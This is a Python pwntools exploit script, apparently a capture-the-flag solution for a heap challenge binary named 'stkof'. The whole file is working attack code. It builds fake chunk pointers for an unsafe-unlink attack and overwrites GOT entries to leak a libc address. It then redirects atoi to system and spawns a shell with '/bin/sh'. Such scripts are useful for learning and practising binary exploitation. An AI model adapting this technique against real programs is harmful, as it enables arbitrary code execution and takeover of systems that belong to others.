#coding:utf8
from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./stkof"
libc_binary = "/lib/x86_64-linux-gnu/libc.so.6"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
libc = ELF(libc_binary)

context.arch = "amd64"

def add(size):
    p.sendline("1")
    p.sendline(str(size))

def free(idx):
    p.sendline("3")
    p.sendline(str(idx))

def edit(idx,content):
    p.sendline("2")
    p.sendline(str(idx))
    p.sendline(str(len(content)))
    p.send(str(content))

add(0x80)
add(0x30)
add(0x80)
add(0x80)

x = 0x602150 # leak
fake_fd = x-0x18
fake_bk = x-0x10

payload = flat([
    0,0x20,
    fake_fd,fake_bk,
    0x20,0,
    0x30,0x90
    ])
edit(2,payload)
free(3)

payload = flat([
    "x"*0x10,elf.got["atoi"],
    elf.got["free"],elf.got["atoi"],elf.got["atoi"]
    ])

edit(2,payload)
edit(2,p64(elf.plt["puts"]))
free(1)
p.recv(0x20)

atoi_addr = u64(p.recv(6).ljust(8,"\0"))
libc_base = atoi_addr - libc.sym["atoi"]
system_addr = libc_base + libc.sym["system"]
log.success("system address is -> "+ hex( system_addr ))
edit(4,p64(system_addr))
free("/bin/sh\x00")

# gdb.attach(p,"set $h=0xe064b0,$g=0x602140")

p.interactive()
